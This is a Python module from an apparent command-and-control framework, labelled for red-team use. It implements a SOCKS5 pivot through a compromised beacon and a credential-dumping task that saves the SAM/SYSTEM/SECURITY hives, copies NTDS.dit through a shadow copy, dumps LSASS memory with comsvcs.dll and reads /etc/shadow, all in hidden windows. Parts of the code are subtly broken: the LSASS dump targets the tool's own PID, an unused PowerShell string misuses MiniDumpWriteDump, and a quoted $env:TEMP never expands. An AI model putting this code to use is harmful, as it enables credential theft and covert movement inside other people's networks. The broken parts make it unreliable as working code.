"""
Forge C2 — SOCKS Proxy Task
================================
Deploy a SOCKS5 proxy through a beacon for pivoting.

Creates a local SOCKS5 server on the operator's machine that
tunnels traffic through the compromised beacon, enabling access
to internal networks that aren't directly reachable.

Architecture:
    ┌──────────┐   SOCKS5    ┌──────────┐   C2 tunnel   ┌──────────┐
    │ Operator │ ──────────► │  SOCKS   │ ────────────► │  Beacon  │
    │  tools   │             │  proxy   │                │ (target) │
    │ (nmap,   │             │ (local)  │                │          │
    │  curl)   │             │ :1080    │                │          │
    └──────────┘             └──────────┘                └──────────┘
                                                              │
                                                         ┌────▼────┐
                                                         │ Internal│
                                                         │ Network │
                                                         └─────────┘

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import logging
import os
import struct
import time
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.socks")


@register_task
class SocksTask(BaseTask):
    """Deploy a SOCKS5 proxy through a beacon.

    This task runs on the operator side — it creates a local
    SOCKS5 server that routes traffic through the C2 channel
    to the beacon, which then makes the actual connections
    to internal targets.

    Args (via kwargs):
        port:         Local SOCKS port (default 1080).
        bind_host:    Local bind address (default 127.0.0.1).
        auth:         Require SOCKS auth (default False).
        username:     SOCKS auth username.
        password:     SOCKS auth password.

    Usage::

        task = SocksTask(task_id="socks1", port=1080)
        result = await task.execute()  # Starts SOCKS server

        # Then in another terminal:
        # proxychains nmap -sT 10.0.0.0/24
    """

    TASK_TYPE = "socks"
    DESCRIPTION = "SOCKS5 proxy pivot"
    OPSEC_RISK = "high"

    async def execute(self) -> TaskResult:
        port = self.args.get("port", 1080)
        bind_host = self.args.get("bind_host", "127.0.0.1")
        require_auth = self.args.get("auth", False)
        username = self.args.get("username", "")
        password = self.args.get("password", "")

        start = time.time()

        try:
            server = await asyncio.start_server(
                lambda r, w: self._handle_socks_client(r, w, require_auth, username, password),
                bind_host, port,
            )

            log.info("SOCKS5 proxy started on %s:%d", bind_host, port)

            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.COMPLETED,
                output=f"SOCKS5 proxy listening on {bind_host}:{port}",
                started_at=start,
                completed_at=time.time(),
                metadata={
                    "bind": f"{bind_host}:{port}",
                    "auth": require_auth,
                    "protocol": "socks5",
                },
            )

        except OSError as exc:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"Failed to bind SOCKS proxy: {exc}",
                started_at=start,
                completed_at=time.time(),
            )
        except Exception as exc:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=str(exc),
                started_at=start,
                completed_at=time.time(),
            )

    async def _handle_socks_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        require_auth: bool,
        username: str,
        password: str,
    ) -> None:
        """Handle a SOCKS5 client connection.

        Implements the SOCKS5 handshake (RFC 1928):
        1. Method negotiation
        2. Optional username/password auth (RFC 1929)
        3. Connection request
        4. Relay data bidirectionally
        """
        try:
            # ── Step 1: Method negotiation ────────────────────────────
            header = await asyncio.wait_for(reader.readexactly(2), timeout=10.0)
            version, nmethods = struct.unpack("BB", header)

            if version != 0x05:
                writer.close()
                return

            methods = await reader.readexactly(nmethods)

            if require_auth:
                # Require username/password auth (method 0x02)
                if 0x02 not in methods:
                    writer.write(b"\x05\xFF")  # No acceptable methods
                    await writer.drain()
                    writer.close()
                    return
                writer.write(b"\x05\x02")  # Select username/password
                await writer.drain()

                # ── Step 2: Auth (RFC 1929) ───────────────────────────
                auth_ver = await reader.readexactly(1)
                ulen = struct.unpack("B", await reader.readexactly(1))[0]
                uname = (await reader.readexactly(ulen)).decode()
                plen = struct.unpack("B", await reader.readexactly(1))[0]
                passwd = (await reader.readexactly(plen)).decode()

                if uname != username or passwd != password:
                    writer.write(b"\x01\x01")  # Auth failure
                    await writer.drain()
                    writer.close()
                    return

                writer.write(b"\x01\x00")  # Auth success
                await writer.drain()
            else:
                # No auth required (method 0x00)
                writer.write(b"\x05\x00")
                await writer.drain()

            # ── Step 3: Connection request ────────────────────────────
            req_header = await asyncio.wait_for(reader.readexactly(4), timeout=10.0)
            ver, cmd, _, atyp = struct.unpack("BBBB", req_header)

            if cmd != 0x01:  # Only CONNECT supported
                writer.write(b"\x05\x07\x00\x01" + b"\x00" * 6)  # Command not supported
                await writer.drain()
                writer.close()
                return

            # Parse destination address
            if atyp == 0x01:  # IPv4
                dst_addr_raw = await reader.readexactly(4)
                dst_addr = ".".join(str(b) for b in dst_addr_raw)
            elif atyp == 0x03:  # Domain name
                domain_len = struct.unpack("B", await reader.readexactly(1))[0]
                dst_addr = (await reader.readexactly(domain_len)).decode()
            elif atyp == 0x04:  # IPv6
                dst_addr_raw = await reader.readexactly(16)
                dst_addr = ":".join(f"{dst_addr_raw[i]:02x}{dst_addr_raw[i+1]:02x}"
                                     for i in range(0, 16, 2))
            else:
                writer.close()
                return

            dst_port = struct.unpack("!H", await reader.readexactly(2))[0]

            log.debug("SOCKS5 CONNECT → %s:%d", dst_addr, dst_port)

            # ── Step 4: Connect to destination ────────────────────────
            try:
                remote_reader, remote_writer = await asyncio.wait_for(
                    asyncio.open_connection(dst_addr, dst_port),
                    timeout=30.0,
                )
            except Exception:
                # Connection failed
                writer.write(b"\x05\x05\x00\x01" + b"\x00" * 6)
                await writer.drain()
                writer.close()
                return

            # Success response
            writer.write(
                b"\x05\x00\x00\x01"
                + b"\x00\x00\x00\x00"    # Bind addr (0.0.0.0)
                + struct.pack("!H", 0)   # Bind port
            )
            await writer.drain()

            # ── Step 5: Bidirectional relay ────────────────────────────
            await asyncio.gather(
                self._relay(reader, remote_writer),
                self._relay(remote_reader, writer),
            )

        except (asyncio.TimeoutError, asyncio.IncompleteReadError):
            pass
        except Exception as exc:
            log.debug("SOCKS5 handler error: %s", exc)
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    @staticmethod
    async def _relay(
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        """Relay data between two streams."""
        try:
            while True:
                data = await reader.read(8192)
                if not data:
                    break
                writer.write(data)
                await writer.drain()
        except Exception:
            pass
        finally:
            try:
                writer.close()
            except Exception:
                pass


# ══════════════════════════════════════════════════════════════════════
#  HASH DUMP TASK
# ══════════════════════════════════════════════════════════════════════

@register_task
class HashDumpTask(BaseTask):
    """Dump password hashes from the target system.

    Windows: SAM database (local accounts) or NTDS.dit (domain).
    Linux: /etc/shadow (requires root).

    This is the setup/coordination task — the actual dumping
    logic runs platform-specific commands.

    Args (via kwargs):
        method:  "sam" (local), "ntds" (domain), "lsass" (memory), "shadow" (linux).
        output:  Where to save results on target (temp by default).

    OPSEC WARNING: Hash dumps are NOISY. LSASS access triggers
    EDR alerts. SAM/NTDS access leaves forensic artifacts.
    """

    TASK_TYPE = "hashdump"
    DESCRIPTION = "Dump password hashes"
    OPSEC_RISK = "critical"

    async def execute(self) -> TaskResult:
        method = self.args.get("method", "sam")
        start = time.time()

        try:
            import platform as plat

            if plat.system() == "Windows":
                if method == "sam":
                    return await self._dump_sam(start)
                elif method == "ntds":
                    return await self._dump_ntds(start)
                elif method == "lsass":
                    return await self._dump_lsass(start)
                else:
                    return TaskResult(
                        task_id=self.task_id,
                        status=TaskStatus.FAILED,
                        error=f"Unknown dump method: {method}",
                        started_at=start,
                    )
            elif plat.system() == "Linux":
                return await self._dump_shadow(start)
            else:
                return TaskResult(
                    task_id=self.task_id,
                    status=TaskStatus.FAILED,
                    error=f"Unsupported platform: {plat.system()}",
                    started_at=start,
                )

        except Exception as exc:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=str(exc),
                started_at=start,
                completed_at=time.time(),
            )

    async def _dump_sam(self, start: float) -> TaskResult:
        """Dump SAM database using reg save."""
        commands = [
            "reg save HKLM\\SAM %TEMP%\\forge_sam.save /y",
            "reg save HKLM\\SYSTEM %TEMP%\\forge_system.save /y",
            "reg save HKLM\\SECURITY %TEMP%\\forge_security.save /y",
        ]

        output_lines: list[str] = []

        for cmd in commands:
            proc = await asyncio.create_subprocess_exec(
                "cmd.exe", "/c", cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                creationflags=0x08000000,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30.0)
            out = stdout.decode(errors="replace") + stderr.decode(errors="replace")
            output_lines.append(f"[{cmd}] → {out.strip()}")

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED,
            output="\n".join(output_lines),
            started_at=start,
            completed_at=time.time(),
            metadata={
                "method": "sam",
                "files": ["%TEMP%\\forge_sam.save", "%TEMP%\\forge_system.save",
                          "%TEMP%\\forge_security.save"],
            },
        )

    async def _dump_ntds(self, start: float) -> TaskResult:
        """Dump NTDS.dit using ntdsutil or vssadmin shadow copy."""
        cmd = (
            'powershell.exe -NoProfile -Command "'
            "$s = (Get-WmiObject Win32_ShadowCopy -List).Create('C:\\','ClientAccessible');"
            "Copy-Item '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit' "
            "'$env:TEMP\\forge_ntds.dit'"
            '"'
        )

        proc = await asyncio.create_subprocess_exec(
            "cmd.exe", "/c", cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            creationflags=0x08000000,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120.0)
        output = stdout.decode(errors="replace") + stderr.decode(errors="replace")

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED,
            output=f"NTDS dump attempted:\n{output}",
            started_at=start,
            completed_at=time.time(),
            metadata={"method": "ntds"},
        )

    async def _dump_lsass(self, start: float) -> TaskResult:
        """Dump LSASS process memory for credential extraction."""
        cmd = (
            'powershell.exe -NoProfile -Command "'
            "$proc = Get-Process lsass;"
            "[System.IO.File]::WriteAllBytes("
            "'$env:TEMP\\forge_lsass.dmp',"
            "(New-Object System.Diagnostics.Process).GetType().GetMethod('MiniDumpWriteDump')"
            ")"
            '"'
        )

        # Rundll32 method is more reliable
        cmd_alt = (
            'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump '
            f'{os.getpid()} %TEMP%\\forge_lsass.dmp full'
        )

        proc = await asyncio.create_subprocess_exec(
            "cmd.exe", "/c", cmd_alt,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            creationflags=0x08000000,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60.0)
        output = stdout.decode(errors="replace") + stderr.decode(errors="replace")

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED,
            output=f"LSASS dump attempted:\n{output}",
            started_at=start,
            completed_at=time.time(),
            metadata={"method": "lsass"},
        )

    async def _dump_shadow(self, start: float) -> TaskResult:
        """Dump /etc/shadow on Linux."""
        proc = await asyncio.create_subprocess_exec(
            "cat", "/etc/shadow",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10.0)
        output = stdout.decode(errors="replace")
        err = stderr.decode(errors="replace")

        if proc.returncode == 0:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.COMPLETED,
                output=output,
                started_at=start,
                completed_at=time.time(),
                metadata={"method": "shadow", "lines": output.count("\n")},
            )
        else:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=err or "Permission denied (need root)",
                started_at=start,
                completed_at=time.time(),
            )


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestSocksTask:
    """Tests for SOCKS proxy task."""

    def test_encode(self) -> None:
        task = SocksTask(task_id="sock1", port=9050)
        encoded = task.encode()
        assert encoded["type"] == "socks"
        assert encoded["args"]["port"] == 9050


class TestHashDumpTask:
    """Tests for hash dump task."""

    def test_encode(self) -> None:
        task = HashDumpTask(task_id="hd1", method="sam")
        encoded = task.encode()
        assert encoded["type"] == "hashdump"
        assert encoded["args"]["method"] == "sam"

    def test_decode(self) -> None:
        data = {"task_id": "hd2", "type": "hashdump", "args": {"method": "ntds"}}
        task = HashDumpTask.decode(data)
        assert task.args["method"] == "ntds"
